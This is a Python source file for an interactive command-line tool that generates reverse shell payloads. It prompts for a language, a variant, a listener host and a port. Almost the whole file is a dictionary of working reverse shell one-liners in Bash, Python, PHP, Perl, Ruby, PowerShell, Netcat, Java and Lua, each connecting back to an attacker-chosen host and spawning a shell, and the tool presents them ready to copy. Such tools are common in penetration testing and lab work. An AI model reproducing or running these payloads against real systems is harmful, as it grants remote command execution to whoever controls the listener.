"""Reverse Shell Generator — pick a language, enter host/port, get a payload."""

from InquirerPy import inquirer
from rich.console import Console
from rich.panel import Panel


SHELLS: dict[str, dict[str, str]] = {
    "Bash": {
        "bash -i": "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1",
        "bash tcp (exec)": "exec 5<>/dev/tcp/{LHOST}/{LPORT}; cat <&5 | while read line; do $line 2>&5 >&5; done",
        "bash udp": "sh -i >& /dev/udp/{LHOST}/{LPORT} 0>&1",
    },
    "Python": {
        "python3 import os": (
            "python3 -c 'import socket,subprocess,os;"
            "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            "s.connect((\"{LHOST}\",{LPORT}));"
            "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
            "subprocess.call([\"/bin/sh\",\"-i\"])'"
        ),
        "python3 pty": (
            "python3 -c 'import socket,subprocess,os;import pty;"
            "s=socket.socket();s.connect((\"{LHOST}\",{LPORT}));"
            "[os.dup2(s.fileno(),fd) for fd in (0,1,2)];"
            "pty.spawn(\"/bin/bash\")'"
        ),
    },
    "PHP": {
        "php exec": "php -r '$sock=fsockopen(\"{LHOST}\",{LPORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "php proc_open": (
            "php -r '$d=array(0=>array(\"pipe\",\"r\"),1=>array(\"pipe\",\"w\"),2=>array(\"pipe\",\"w\"));"
            "$p=proc_open(\"/bin/sh\",$d,$pipes);'"
        ),
    },
    "Perl": {
        "perl": (
            "perl -e 'use Socket;$i=\"{LHOST}\";$p={LPORT};"
            "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
            "if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");"
            "open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
        ),
    },
    "Ruby": {
        "ruby": (
            "ruby -rsocket -e'f=TCPSocket.open(\"{LHOST}\",{LPORT}).to_i;"
            "exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
        ),
    },
    "PowerShell": {
        "powershell": (
            "powershell -nop -c \"$c=New-Object System.Net.Sockets.TCPClient('{LHOST}',{LPORT});"
            "$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
            "while(($i=$s.Read($b,0,$b.Length)) -ne 0)"
            "{{$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);"
            "$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';"
            "$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}};"
            "$c.Close()\""
        ),
    },
    "Netcat": {
        "nc -e": "nc -e /bin/sh {LHOST} {LPORT}",
        "nc mkfifo": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f",
        "ncat (nmap)": "ncat {LHOST} {LPORT} -e /bin/sh",
    },
    "Java": {
        "java runtime": (
            "r = Runtime.getRuntime()\n"
            "p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{LHOST}/{LPORT};"
            "cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[])\n"
            "p.waitFor()"
        ),
    },
    "Lua": {
        "lua": (
            "lua -e \"require('socket');require('os');"
            "t=socket.tcp();t:connect('{LHOST}','{LPORT}');"
            "os.execute('/bin/sh -i <&3 >&3 2>&3');\""
        ),
    },
}


def run(console: Console) -> None:
    """Generate a reverse shell payload."""
    console.print("\n[bold cyan]━━━ Reverse Shell Generator ━━━[/bold cyan]\n")

    language = inquirer.select(
        message="Select language:",
        choices=list(SHELLS.keys()),
    ).execute()

    variants = SHELLS[language]
    variant = inquirer.select(
        message="Select variant:",
        choices=list(variants.keys()),
    ).execute()

    lhost = inquirer.text(message="LHOST:", default="10.10.14.1").execute()
    lport = inquirer.text(message="LPORT:", default="4444").execute()

    payload = variants[variant].replace("{LHOST}", lhost).replace("{LPORT}", lport)

    console.print()
    console.print(Panel(payload, title=f"{language} — {variant}", border_style="green", expand=False))
    console.print("[dim]Copy the payload above.[/dim]")
